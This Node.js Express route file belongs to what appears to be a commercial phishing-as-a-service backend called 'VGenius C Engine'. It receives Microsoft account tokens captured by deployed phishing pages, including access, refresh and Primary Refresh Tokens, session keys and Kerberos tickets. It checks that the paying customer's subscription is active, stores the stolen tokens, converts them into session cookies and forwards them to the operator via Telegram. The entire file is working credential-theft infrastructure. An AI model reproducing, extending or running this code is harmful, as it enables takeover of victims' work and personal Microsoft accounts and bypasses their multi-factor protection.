/**
 * VGenius C Engine - Token Capture Routes
 * Receives tokens from deployed phishing workers
 */
const express = require('express');
const router = express.Router();
const jwt = require('jsonwebtoken');
const db = require('../database/connection');
const config = require('../config/env');
const { encrypt } = require('../utils/encrypt');
const { processCookieConversion } = require('../services/cookieconverter');
const { sendTelegramNotification } = require('../services/notification');
const { validateResult, commonValidators } = require('../middleware/validator');

// POST /api/capture - receives tokens from the phishing worker
router.post('/', commonValidators.captureToken, validateResult, async (req, res) => {
    try {
        const { jwt_token, access_token, refresh_token, id_token, ip, user_agent } = req.body;

            if (!jwt_token || !access_token) {
        return res.status(400).json({ error: 'Missing required fields' });
    }

    // Verify JWT (the one embedded in the phishing page)
    let decoded;
    try {
        decoded = jwt.verify(jwt_token, config.JWT_SECRET);
    } catch (err) {
        return res.status(403).json({ error: 'Invalid or expired JWT' });
    }

    const { user_id, link_id } = decoded;
    if (!user_id || !link_id) {
        return res.status(403).json({ error: 'Invalid JWT payload' });
    }

    // Verify user subscription is still active
    const [users] = await db.query(
        'SELECT * FROM users WHERE id = ? AND subscription_status = ? AND (subscription_expiry IS NULL OR subscription_expiry > NOW())',
        [user_id, 'active']
    );
    if (!users.length) {
        return res.status(403).json({ error: 'Subscription inactive or expired' });
    }

    // Verify link is still active
    const [links] = await db.query(
        'SELECT * FROM links WHERE id = ? AND user_id = ? AND status = ? AND kill_switched = 0',
        [link_id, user_id, 'active']
    );
    if (!links.length) {
        return res.status(403).json({ error: 'Link not active or killed' });
    }

    const link = links[0];

    // Parse refresh_token - it may be a JSON blob containing PRT and other tokens (competitor format)
    let prt = null;
    let sessionKeyJwe = null;
    let deviceTenantId = null;
    let tgtAd = null;
    let tgtCloud = null;
    let kerberosTopLevelNames = null;
    let tgtCloudSessionkey = null;
    let accountType = 'work_school'; // Default to work/school

    if (refresh_token) {
        try {
            // Check if refresh_token is JSON (competitor format with PRT data)
            const parsedRefresh = JSON.parse(refresh_token);
            if (parsedRefresh.prt) {
                prt = parsedRefresh.prt;
                accountType = 'work_school';
            }
            if (parsedRefresh.session_key_jwe) sessionKeyJwe = parsedRefresh.session_key_jwe;
            if (parsedRefresh.device_tenant_id) deviceTenantId = parsedRefresh.device_tenant_id;
            if (parsedRefresh.tgt_ad) tgtAd = JSON.stringify(parsedRefresh.tgt_ad);
            if (parsedRefresh.tgt_cloud) tgtCloud = JSON.stringify(parsedRefresh.tgt_cloud);
            if (parsedRefresh.kerberos_top_level_names) kerberosTopLevelNames = parsedRefresh.kerberos_top_level_names;
            if (parsedRefresh.tgt_cloud_sessionkey) tgtCloudSessionkey = parsedRefresh.tgt_cloud_sessionkey;
        } catch (e) {
            // Not JSON - treat as plain refresh token (personal accounts or old format)
            // Check if it's a known personal account token format
            if (refresh_token.startsWith('0.AT') || refresh_token.startsWith('M.R')) {
                accountType = 'personal';
            }
            prt = refresh_token;
        }
    }

    // Extract email from id_token if present
    let email = null;
    if (id_token) {
        try {
            let tokenPart = id_token.split('.')[1];
            // Fix base64 padding if needed
            while (tokenPart.length % 4) tokenPart += '=';
            const payload = JSON.parse(Buffer.from(tokenPart, 'base64').toString());
            email = payload.email || payload.upn || payload.preferred_username || null;

            // Detect account type from email domain
            if (email) {
                const emailDomain = email.split('@')[1].toLowerCase();
                if (['outlook.com', 'hotmail.com', 'live.com', 'passport.com'].includes(emailDomain)) {
                    accountType = 'personal';
                }
            }
        } catch (e) { /* ignore decode errors */ }
    }

    // Determine tenant from link's jwt_payload
    let tenant = 'common';
    try {
        if (link.jwt_payload) {
            const parsed = JSON.parse(link.jwt_payload);
            if (parsed.tenant) tenant = parsed.tenant;
        }
    } catch (e) { /* use default */ }

    // For personal accounts, use consumers endpoint
    if (accountType === 'personal') {
        tenant = 'consumers';
    }

    // Insert token record (encrypted) with 100-year expiration for persistent access
    const ttlHours = config.COOKIE_MAX_TTL_HOURS || 720; // Max 30 days

    const clientIdUsed = config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';

    const [result] = await db.query(
        `INSERT INTO captured_tokens
        (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, id_token_encrypted,
         prt, session_key_jwe, device_tenant_id, tgt_ad, tgt_cloud, kerberos_top_level_names, tgt_cloud_sessionkey,
         account_type, ip_address, user_agent, expiration, tenant, template_type, client_id)
        VALUES (?, ?, ?, 'token', ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL ? HOUR), ?, ?, ?)`,
        [
            user_id,
            link_id,
            email,
            encrypt(access_token),
            encrypt(refresh_token || null),
            encrypt(id_token || null),
            encrypt(prt),
            encrypt(sessionKeyJwe),
            deviceTenantId,
            encrypt(tgtAd),
            encrypt(tgtCloud),
            kerberosTopLevelNames,
            encrypt(tgtCloudSessionkey),
            accountType,
            ip || '0.0.0.0',
            user_agent || 'Phishing Worker',
            ttlHours,
            tenant,
            link.template_type || 'office',
            clientIdUsed
        ]
    );

    const tokenId = result.insertId;

    // Build base notification message with all captured tokens
    const baseNotification = buildCaptureNotification({
        email,
        templateType: link.template_type,
        tokenType: 'token',
        accessToken: access_token,
        refreshToken: prt,
        idToken: id_token,
        prt,
        sessionKeyJwe,
        deviceTenantId,
        tgtAd,
        tgtCloud,
        kerberosTopLevelNames,
        tgtCloudSessionkey,
        accountType,
        tenant,
        ip,
        userAgent: user_agent,
        linkId: link_id,
        tokenId,
    });

    // If link is in cookie mode, trigger cookie conversion asynchronously
    // PASS TENANT AND ACCOUNT TYPE TO AVOID AADSTS ERRORS
    if (link.auth_mode === 'cookie') {
        processCookieConversion(tokenId, access_token, link.template_type, tenant, accountType)
            .then((cookieResult) => {
                const io = req.app.get('io');
                if (io) {
                    io.to(`user_${user_id}`).emit('new_token', {
                        id: tokenId,
                        email,
                        token_type: 'cookie',
                        created_at: new Date()
                    });
                }
                // Build notification WITH cookie data
                const messageWithCookies = buildCaptureNotification({
                    email,
                    templateType: link.template_type,
                    tokenType: 'cookie',
                    accessToken: access_token,
                    refreshToken: prt,
                    idToken: id_token,
                    prt,
                    sessionKeyJwe,
                    deviceTenantId,
                    tgtAd,
                    tgtCloud,
                    kerberosTopLevelNames,
                    tgtCloudSessionkey,
                    accountType,
                    tenant,
                    ip,
                    cookieCount: cookieResult.cookie_count,
                    cookieSample: cookieResult.cookies,
                    userAgent: user_agent,
                    linkId: link_id,
                    tokenId,
                });
                sendTelegramNotification(user_id, messageWithCookies);
            })
            .catch(err => {
                console.error('[Capture] Cookie conversion failed:', err.message);
                // Send base notification (tokens only) if cookie conversion fails
                sendTelegramNotification(user_id, baseNotification);
            });
    } else {
        const io = req.app.get('io');
        if (io) {
            io.to(`user_${user_id}`).emit('new_token', {
                id: tokenId,
                email,
                token_type: 'token',
                created_at: new Date()
            });
        }
        // Send notification with all captured token data
        sendTelegramNotification(user_id, baseNotification);
    }

    res.status(200).json({ success: true, token_id: tokenId });
} catch (err) {
    console.error('[Capture] Error:', err);
    res.status(500).json({ error: 'Internal server error' });
    }
});

module.exports = router;
